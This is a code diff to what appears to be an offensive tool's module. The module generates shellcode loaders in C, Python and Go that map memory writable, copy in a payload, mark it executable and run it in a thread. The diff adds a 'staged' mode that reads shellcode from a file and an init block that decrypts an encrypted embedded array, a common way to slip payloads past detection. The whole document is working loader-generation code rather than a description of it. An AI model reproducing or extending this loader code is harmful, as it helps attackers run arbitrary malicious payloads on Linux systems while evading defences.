@@ -19,6 +19,9 @@ from . import _render
 
 _render.self_register(__name__, "linux_mmap_rw_rx")
 
+# {sc_embed}    — global declarations (encrypted array + key, or empty for staged)
+# {sc_init}     — in-main init block (decrypt loop or file-reading code)
+# {main_decl}   — main() signature (void or int argc, char *argv[])
 _C_TEMPLATE = """\
 #include <stdio.h>
 #include <string.h>
@@ -26,14 +29,15 @@ _C_TEMPLATE = """\
 #include <sys/mman.h>
 #include <pthread.h>
 
-{sc_array}
+{sc_embed}
 
 static void *run(void *arg) {{
     ((void (*)(void))arg)();
     return NULL;
 }}
 
-int main(void) {{
+{main_decl} {{
+    {sc_init}
     void *mem = mmap(NULL, sc_len,
                      PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS,
@@ -104,6 +108,9 @@ libpthread.pthread_join(tid, None)
 """
 
 
+# {sc_embed}    — package-level declarations (or empty for staged)
+# {sc_init}     — first statement(s) in main (decrypt loop or file-reading)
+# {sc_imports}  — extra import entries, e.g. \n\t"os" for staged
 _GO_TEMPLATE = """\
 //go:build linux
 
@@ -112,12 +119,13 @@ package main
 import (
 \t"runtime"
 \t"syscall"
-\t"unsafe"
+\t"unsafe"{sc_imports}
 )
 
-{sc_bytes}
+{sc_embed}
 
 func main() {{
+\t{sc_init}
 \tmem, err := syscall.Mmap(-1, 0, len(sc),
 \t\tsyscall.PROT_READ|syscall.PROT_WRITE,
 \t\tsyscall.MAP_PRIVATE|syscall.MAP_ANONYMOUS)
@@ -145,16 +153,27 @@ func main() {{
 """
 
 
-def generate_c(shellcode: bytes) -> str:
+def generate_c(shellcode: bytes, staged: bool = False) -> str:
     """Return a compilable C loader using mmap(RW) + mprotect(RX) + pthread_create."""
-    return _C_TEMPLATE.format(sc_array=_render.c_array_literal(shellcode, "sc"))
+    if staged:
+        embed, init = _render.c_staged_sc("sc")
+        main_decl = "int main(int argc, char *argv[])"
+    else:
+        embed, init = _render.c_sc_block(shellcode, "sc")
+        main_decl = "int main(void)"
+    return _C_TEMPLATE.format(sc_embed=embed, sc_init=init, main_decl=main_decl)
 
 
-def generate_python(shellcode: bytes) -> str:
+def generate_python(shellcode: bytes, staged: bool = False) -> str:
     """Return a Python ctypes loader using mmap(RW) + mprotect(RX) + pthread_create."""
-    return _PY_TEMPLATE.format(sc_bytes=_render.python_bytes_literal(shellcode, "sc"))
+    sc_bytes = _render.py_staged_sc("sc") if staged else _render.py_sc_block(shellcode, "sc")
+    return _PY_TEMPLATE.format(sc_bytes=sc_bytes)
 
 
-def generate_go(shellcode: bytes) -> str:
+def generate_go(shellcode: bytes, staged: bool = False) -> str:
     """Return a Go loader using mmap(RW) -> mprotect(RX) + goroutine on locked OS thread."""
-    return _GO_TEMPLATE.format(sc_bytes=_render.go_bytes_literal(shellcode, "sc"))
+    if staged:
+        embed, init, imports = _render.go_staged_sc("sc")
+    else:
+        embed, init, imports = _render.go_sc_block(shellcode, "sc")
+    return _GO_TEMPLATE.format(sc_embed=embed, sc_init=init, sc_imports=imports)
